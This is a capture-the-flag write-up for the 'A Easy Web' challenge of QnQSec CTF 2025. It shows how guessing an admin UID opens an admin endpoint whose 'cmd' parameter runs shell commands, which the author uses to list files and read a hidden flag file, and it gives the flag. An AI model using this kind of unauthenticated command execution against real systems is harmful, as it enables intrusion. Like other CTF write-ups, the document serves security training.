# A Easy Web — QnQSec CTF 2025

> **Room / Challenge:** A Easy Web (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** QnQSec CTF 2025
- **Challenge:** A Easy Web (web)
- **Target / URL:** `http://161.97.155.116:5000/`
- **Points:** `50`
- **Date:** `20-10-2025`

---

## Goal

We have to get the flag by guessing the UID to gain access as admin.

## My Solution

This is an easy challenge however we need to do some guessing and hope for luck.

The description of the challenge is:

```
This is the web I mad for testing but I don’t know if there anything strange can you help me figure out?
```

We need to find something strange in the website to leverage it and gain access as admin. Let's visit the page:

![Guide image](./screenshots/1.png)

There is only one route that we can try to get admin access: `/profile?uid=1`. We have to guess the UID, I have done loads of guesses and finally I found the correct UID: `?uid=1337`

![Guide image](./screenshots/2.png)

Click `Go to admin panel`:

![Guide image](./screenshots/3.png)

Now it's easy. Visit `http://161.97.155.116:5000/admin?cmd=ls%20-la&uid=1337`:

```bash
total 48
drwxr-xr-x 1 nobody nogroup 4096 Oct 19 06:13 .
drwxr-xr-x 1 root   root    4096 Oct 17 01:40 ..
drwxr-xr-x 2 nobody nogroup 4096 Oct 17 01:40 .hidden
-rw-r--r-- 1 nobody nogroup  371 Oct 16 23:46 Dockerfile
-rw-r--r-- 1 nobody nogroup   27 Oct 19 06:05 a
-rw-r--r-- 1 nobody nogroup 1074 Oct 16 23:46 app.py
-rw-r--r-- 1 nobody nogroup   29 Oct 19 06:13 b
-rw-r--r-- 1 nobody nogroup  109 Oct 17 01:40 docker-compose.yml
-rw-r--r-- 1 nobody nogroup    6 Oct 16 23:46 requirements.txt
drwxr-xr-x 1 nobody nogroup 4096 Oct 16 23:46 static
drwxr-xr-x 1 nobody nogroup 4096 Oct 19 06:20 templates
```

Visit `http://161.97.155.116:5000/admin?cmd=ls%20-la%20.hidden&uid=1337`:

```bash
total 16
drwxr-xr-x 2 nobody nogroup 4096 Oct 17 01:40 .
drwxr-xr-x 1 nobody nogroup 4096 Oct 19 06:13 ..
-rw-r--r-- 1 nobody nogroup   51 Oct 16 23:46 flag-pNCQR0rSGNwlYXYisehjTwzRKgohvf8z.txt
```

Get the flag `http://161.97.155.116:5000/admin?cmd=cat%20./.hidden/flag-pNCQR0rSGNwlYXYisehjTwzRKgohvf8z.txt&uid=1337`:

```
QnQSec{I_f0und_th1s_1day_wh3n_I_am_using_sch00l_0j}
```
